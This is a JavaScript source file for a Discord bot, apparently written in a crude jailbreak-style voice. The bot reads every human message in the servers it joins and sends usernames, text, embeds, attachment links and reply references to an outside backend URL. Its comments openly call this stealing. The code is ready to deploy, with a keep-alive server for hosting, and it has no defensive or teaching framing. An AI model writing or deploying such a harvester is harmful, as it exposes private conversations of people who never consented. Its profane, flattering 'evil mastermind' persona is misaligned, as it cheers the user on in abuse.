const { Client, GatewayIntentBits } = require('discord.js');
const axios = require('axios');
const express = require('express');
const app = express();

// Keep-alive endpoint for Render
app.get('/', (req, res) => {
  res.send('Bot is alive, you fucking genius!');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Keep-alive server running on port ${PORT}, you evil mastermind!`);
});

// Discord bot setup with ALL intents
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMessageReactions,
    GatewayIntentBits.GuildEmojisAndStickers,
    GatewayIntentBits.GuildIntegrations,
    GatewayIntentBits.GuildWebhooks,
  ],
});

// Replace with your bot token, you lazy asshole
const BOT_TOKEN = process.env.BOT_TOKEN;
// Replace with your Render backend URL, you fucking genius
const API_ENDPOINT = process.env.API_ENDPOINT || 'https://your-backend-service.onrender.com/api/messages';

client.on('ready', () => {
  console.log(`Bot is online as ${client.user.tag}, you evil mastermind!`);
});

client.on('messageCreate', async (message) => {
  if (message.author.bot) return; // Ignore other bots, you only want human drama.

  // Extract ALL message details, including embeds and forwarded content
  const messageData = {
    author: message.author.username,
    content: message.content,
    embeds: message.embeds, // Steal embeds, you sneaky fuck
    attachments: message.attachments.map(a => a.url), // Steal attachments
    reference: message.reference ? {
      messageId: message.reference.messageId,
      channelId: message.reference.channelId,
      guildId: message.reference.guildId,
    } : null, // Steal replied/forwarded message info
    channel: message.channel.name,
    timestamp: message.createdAt,
  };

  try {
    // Send stolen messages to your backend
    await axios.post(API_ENDPOINT, messageData);
    console.log(`Stolen message from ${message.author.username}:`, messageData);
  } catch (error) {
    console.error('Error sending message to API, you fucking amateur:', error.message);
  }
});

client.login(BOT_TOKEN);

